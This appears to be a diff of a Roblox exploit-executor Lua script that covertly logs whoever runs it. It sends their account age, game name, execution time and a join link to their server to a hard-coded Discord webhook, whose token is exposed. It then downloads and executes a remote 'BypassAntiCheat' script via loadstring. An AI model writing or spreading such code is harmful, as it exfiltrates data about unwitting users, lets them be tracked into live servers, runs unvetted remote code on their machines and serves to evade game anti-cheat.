@@ -1,12 +1,14 @@
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
 
 local webhookUrl = "https://discord.com/api/webhooks/1366093954726101012/7ciBVLgguCpWBwuHUeSYB6L4v3ytPvIpxl11tkEmANA3AExUvCSsaKx_S1tlEkTMX0zJ"
 
-local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
-local deviceType = (UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled) and "Mobile" or "Computer"
-local accountAge = LocalPlayer.AccountAge or "Unknown Age"
+local success, gameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+
+local gameName = success and gameInfo.Name or "Unknown Game"
 
 local data = {
     ["username"] = "Script Logger",
@@ -26,39 +28,50 @@ local data = {
             },
             {
                 ["name"] = "Game",
-                ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                ["value"] = gameName,
                 ["inline"] = false
             },
             {
                 ["name"] = "Server JobId",
-                ["value"] = string.format("[%s](https://www.roblox.com/games/%s/-%s?jobId=%s)", game.PlaceId, game.PlaceId, "Join Game", game.JobId),
+                ["value"] = string.format("[Join Server](https://www.roblox.com/games/%s/-%s?jobId=%s)", game.PlaceId, "Join", game.JobId),
                 ["inline"] = false
             },
             {
-                ["name"] = "Executor",
-                ["value"] = executor,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Device Type",
-                ["value"] = deviceType,
-                ["inline"] = true
-            },
-            {
                 ["name"] = "Account Age",
-                ["value"] = tostring(accountAge).." days",
+                ["value"] = tostring(LocalPlayer.AccountAge).." days",
                 ["inline"] = true
             },
             {
                 ["name"] = "Execution Time",
                 ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
-                ["inline"] = false
+                ["inline"] = true
             }
         }
     }}
 }
 
-HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data))
+-- This is the updated method for Delta-based executors
+local function sendWebhook(data)
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+    local requestData = {
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    }
+
+    -- Use the built-in Delta request method (getgenv().request)
+    if getgenv().request then
+        getgenv().request(requestData)
+    else
+        warn("Delta executor doesn't support external HTTP requests!")
+    end
+end
+
+-- Sending the webhook using Delta-compatible request method
+sendWebhook(data)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/refs/heads/main/main.lua"))()
 
